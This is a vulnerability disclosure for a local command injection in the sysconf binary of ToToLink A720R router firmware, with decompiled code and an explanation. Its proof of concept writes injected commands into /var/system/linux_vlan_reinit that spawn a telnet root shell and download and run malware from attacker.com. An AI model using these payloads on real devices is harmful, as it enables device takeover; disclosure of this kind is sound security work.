# Command Injection Vulnerability in `/var/system/linux_vlan_reinit`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink A720R Router                                        |
| Firmware Version     | **V4.1.5cu.614_B20230630**                                   |
| Vulnerability Type   | **Local Command Injection via File Input**                   |
| Vulnerable Component | `sysconf` (parses `/var/system/linux_vlan_reinit` and passes values to `system()` via `sub_40AC08`) |
| Prerequisites        | Requires control over `/var/system/linux_vlan_reinit` content or filesystem write permissions (local exploitation only) |

2. Exploitation Path

```c
// sysconf
int sub_40BFA4()
{
  ...
  v0 = isFileExist("/var/system/linux_vlan_reinit");
  v1 = 0;
  if ( v0 )
  {
    v2 = fopen("/var/system/linux_vlan_reinit", "r");
    v1 = -1;
    if ( v2 )
    {
      memset(v9, 0, 256);
      fgets(v9, 256, v2);
      v3 = (const char *)strtok_r(v9, ":", &v8);
      if ( !v3 )
        goto LABEL_11;
      while ( !memcmp(v3, "eth", 3) || !memcmp(v3, "wlan", 4) )
      {
        sub_40AC08("ifconfig %s down", v3);
        sub_40AC08("vconfig rem %s", v3);
        ...
}

int sub_40AC08(const char *a1, ...)
{
  int result; // $v0
  _BYTE v2[260]; // [sp+1Ch] [-104h] BYREF
  va_list va; // [sp+12Ch] [+Ch] BYREF

  va_start(va, a1);
  result = vsnprintf(v2, 256, a1, (int *)va);
  if ( result >= 0 )
  {
    system(v2);
    return 0;
  }
  return result;
}
```

3. **Vulnerable Binaries:** `sysconf`.
4. 0-Day Command Injection Exploitation Path:
   - In the `sysconf` file, at line 14, `fgets(v9, 256, v2)` reads content from `/var/system/linux_vlan_reinit`. Afterward, only the prefixes are checked using `memcmp(v3, "eth", 3)` or `memcmp(v3, "wlan", 4)` without performing any escaping or filtering. The string is then concatenated in line 20 via `sub_408FC8("ifconfig %s down", v3)` and directly passed to `system(v2)` at line 35, leading to a command injection vulnerability.
   - In the `sysconf` file, at line 14, `fgets(v9, 256, v2)` reads content from `/var/system/linux_vlan_reinit`. Afterward, only the prefixes are checked using `memcmp(v3, "eth", 3)` or `memcmp(v3, "wlan", 4)` without performing any escaping or filtering. The string is then concatenated in line 21 via `sub_40AC08("vconfig rem %s", v3)` and directly passed to `system(v2)` at line 35, leading to a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```bash
# Create a malicious configuration file
echo "eth0; telnetd -l /bin/sh -p 4444; reboot" > /var/system/linux_vlan_reinit
echo "wlan0; wget http://attacker.com/malware -O /tmp/exp; sh /tmp/exp" >> /var/system/linux_vlan_reinit
/sysconf &
```